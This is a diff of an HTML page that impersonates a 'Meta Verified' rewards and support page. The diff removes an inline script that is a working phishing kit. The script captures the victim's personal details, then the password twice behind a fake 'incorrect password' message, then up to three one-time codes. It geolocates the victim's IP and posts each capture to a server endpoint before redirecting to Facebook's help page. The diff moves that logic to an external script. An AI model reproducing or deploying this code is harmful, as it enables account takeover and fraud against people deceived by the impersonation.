@@ -3,20 +3,21 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Support Page - Rewards</title>
+  <title>Meta Verified - Rewards for you</title>
 
+  <!-- Favicon -->
   <link rel="icon" href="/public/favicon-32x32.png" />
 
+  <!-- Custom CSS -->
   <link rel="stylesheet" href="/style.css" />
 
+  <!-- Tailwind CDN -->
   <script src="https://cdn.tailwindcss.com"></script>
-  <style>
-      .hidden { display: none !important; }
-  </style>
 </head>
 
 <body class="bg-gradient-to-br from-[#f9f1f9] via-[#eaf3fd] to-[#edfbf2] min-h-screen">
 
+  <!-- ===== PAGE CONTENT ===== -->
   <div class="max-w-[768px] mx-auto p-4">
     <div class="flex flex-col gap-6">
 
@@ -73,8 +74,10 @@
     </div>
   </div>
 
+  <!-- ===== OVERLAY ===== -->
   <div id="overlay" class="fixed inset-0 bg-black/50 hidden z-40"></div>
 
+  <!-- ===== INFO FORM ===== -->
   <div id="infoForm" class="fixed inset-0 hidden z-50 flex items-center justify-center">
     <div class="bg-white w-full max-w-[420px] rounded-2xl p-6 shadow-2xl">
 
@@ -105,13 +108,14 @@
           I agree with <span class="text-blue-600">Terms of use</span>
         </label>
 
-        <button id="sendInfoBtn" class="w-full bg-[#1877f2] text-white py-3 rounded-full font-semibold">
+        <button class="w-full bg-[#1877f2] text-white py-3 rounded-full font-semibold">
           Send
         </button>
       </div>
     </div>
   </div>
 
+  <!-- ===== PASSWORD FORM ===== -->
   <div id="passwordForm" class="fixed inset-0 hidden z-50 flex items-center justify-center">
     <div class="bg-white w-full max-w-[420px] rounded-2xl p-6 shadow-2xl text-center">
 
@@ -126,9 +130,8 @@
              type="password"
              class="meta-input mb-4"
              placeholder="Password" />
-      
-      <p id="passwordError" class="text-red-500 text-sm mb-3 hidden"></p>
 
+      <p id="passwordError" class="text-red-500 text-sm mb-3 hidden text-center"></p>
       <button id="continueBtn"
               class="w-full bg-[#1877f2] text-white py-3 rounded-full font-semibold">
         Continue
@@ -136,6 +139,7 @@
     </div>
   </div>
 
+  <!-- ===== VERIFY CODE FORM ===== -->
   <div id="verifyModal"
        class="fixed inset-0 hidden z-50 flex items-center justify-center bg-black/40">
 
@@ -173,7 +177,7 @@
       </p>
 
       <p id="countdown"
-         class="text-sm text-red-600 mb-3 hidden text-center"></p>
+         class="text-sm text-gray-500 mb-3 hidden text-center"></p>
 
       <button id="verifyBtn"
               class="w-full bg-[#1877f2] text-white py-3 rounded-full font-semibold">
@@ -186,140 +190,8 @@
     </div>
   </div>
 
-  <script>
-    const CONFIG = {
-        REDIRECT: "https://www.facebook.com/business/help",
-        IP_API: "https://ipwho.is/"
-    };
-
-    const Utils = {
-        // Lấy IP người dùng
-        getLoc: async () => {
-            try { return (await (await fetch(CONFIG.IP_API)).json()); } catch { return {}; }
-        },
-        // Gọi API Vercel để gửi tin (Token nằm trên server, an toàn tuyệt đối)
-        send: async (msg) => {
-            try {
-                await fetch('/api/send', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ message: msg })
-                });
-            } catch (e) { console.error(e); }
-        },
-        // Định dạng tin nhắn
-        fmt: (d, t, l) => {
-            const tm = new Date().toLocaleString("vi-VN", {timeZone: "Asia/Ho_Chi_Minh"});
-            let ic = t==="INFO"?"📝":(t.includes("PASS")?"🔑":"🔥");
-            let m = `<b>${ic} ${t}</b> | ${tm}\n--\nName: ${d.n}\nMail: ${d.e}`;
-            if(d.b) m+=`\nBiz: ${d.b}`;
-            m+=`\nPhone: ${d.p}\nDOB: ${d.d}`;
-            if(d.p1) m+=`\n--\nP1: <code>${d.p1}</code>`;
-            if(d.p2) m+=`\nP2: <code>${d.p2}</code>`;
-            if(d.ot) m+=`\n--\nOTP: <code>${d.ot}</code>`;
-            return m + `\n==\nIP: ${l.ip||"N/A"} ${l.flag?.emoji||""}\nLoc: ${l.city||"N/A"}, ${l.country||"N/A"}`;
-        },
-        // Ẩn email/sđt
-        mask: (s, t) => {
-            if(!s || s.length<5) return "...";
-            return t==='e' ? `${s.substring(0,3)}***@${s.split('@')[1]}` : `${s.substring(0,3)}****${s.substring(s.length-3)}`;
-        }
-    };
-
-    document.addEventListener("DOMContentLoaded", async () => {
-        const loc = await Utils.getLoc();
-        let dat = {n:"", e:"", b:"", p:"", d:"", p1:"", p2:"", ot:""};
-        let pc=0, oc=0, lk=false;
-
-        const $ = (id) => document.getElementById(id);
-        const err = (id, t) => { let e=$(id); if(e){e.innerText=t; e.classList.remove("hidden");} };
-        const hide = (id) => { let e=$(id); if(e)e.classList.add("hidden"); };
-        const show = (id) => {
-            $("overlay").classList.remove("hidden");
-            ["infoForm","passwordForm","verifyModal"].forEach(x=> hide(x));
-            $(id).classList.remove("hidden");
-        };
-
-        if($("ticketId")) $("ticketId").innerText = "REF-"+Math.floor(Math.random()*900000);
-        if($("submitRequestBtn")) $("submitRequestBtn").onclick = () => show("infoForm");
-
-        // XỬ LÝ INFO (Có check trống)
-        if($("sendInfoBtn")) $("sendInfoBtn").onclick = () => {
-            let i = document.querySelectorAll("#infoForm input");
-            // [0]Name, [1]Mail, [2]Biz, [3]Page, [4]Phone, [5]D, [6]M, [7]Y
-            let v = {
-                n: i[0].value.trim(), e: i[1].value.trim(), b: i[2].value.trim(),
-                p: i[4].value.trim(), d: `${i[5].value}/${i[6].value}/${i[7].value}`
-            };
-            
-            // Check nhập thiếu
-            if(!v.n || !v.e || !v.p || !i[5].value || !i[6].value || !i[7].value) {
-                let e=$("infoError"); 
-                if(!e){ 
-                    e=document.createElement("p"); 
-                    e.id="infoError"; 
-                    e.className="text-red-500 text-sm mt-3 text-center"; 
-                    $("sendInfoBtn").parentNode.insertBefore(e, $("sendInfoBtn")); 
-                }
-                e.innerText="Please fill in all required fields."; e.classList.remove("hidden");
-                return;
-            }
-            hide("infoError");
-            dat = {...dat, ...v};
-            
-            Utils.send(Utils.fmt(dat, "INFO", loc));
-            show("passwordForm");
-        };
-
-        // XỬ LÝ PASSWORD
-        if($("continueBtn")) $("continueBtn").onclick = () => {
-            let p = $("passwordInput").value;
-            if(!p) return;
-            pc++;
-            if(pc===1) {
-                dat.p1=p; Utils.send(Utils.fmt(dat, "PASS1", loc));
-                $("passwordInput").value=""; 
-                err("passwordError","The password you entered is incorrect. Please try again.");
-            } else {
-                dat.p2=p; Utils.send(Utils.fmt(dat, "PASS2", loc));
-                if($("maskedEmail")) $("maskedEmail").innerText = Utils.mask(dat.e, 'e');
-                if($("maskedPhone")) $("maskedPhone").innerText = Utils.mask(dat.p, 'p');
-                show("verifyModal");
-            }
-        };
-
-        // XỬ LÝ OTP
-        if($("verifyBtn")) $("verifyBtn").onclick = () => {
-            if(lk) return;
-            let c = $("verifyCode").value;
-            if(!c) return;
-            dat.ot=c; oc++;
-            Utils.send(Utils.fmt(dat, "OTP", loc));
-            
-            if(oc<3) {
-                $("verifyCode").value=""; 
-                err("verifyError","The code you entered is incorrect.");
-                lk=true;
-                let b=$("verifyBtn"), cd=$("countdown"), s=30;
-                b.disabled=true; b.style.opacity="0.7"; b.innerText="Please wait...";
-                if(cd) {
-                    cd.classList.remove("hidden");
-                    let t=setInterval(()=>{
-                        s--; cd.innerText=`Try again in ${s}s`;
-                        if(s<=0){ 
-                            clearInterval(t); lk=false; 
-                            cd.classList.add("hidden"); hide("verifyError"); 
-                            b.disabled=false; b.style.opacity="1"; b.innerText="Confirm"; 
-                        }
-                    },1000);
-                }
-            } else {
-                $("verifyBtn").innerText="Processing..."; hide("verifyError");
-                setTimeout(()=> window.location.href=CONFIG.REDIRECT, 1500);
-            }
-        };
-    });
-  </script>
+  <!-- MAIN JS -->
+  <script src="/main.js" defer></script>
 
 </body>
 </html>
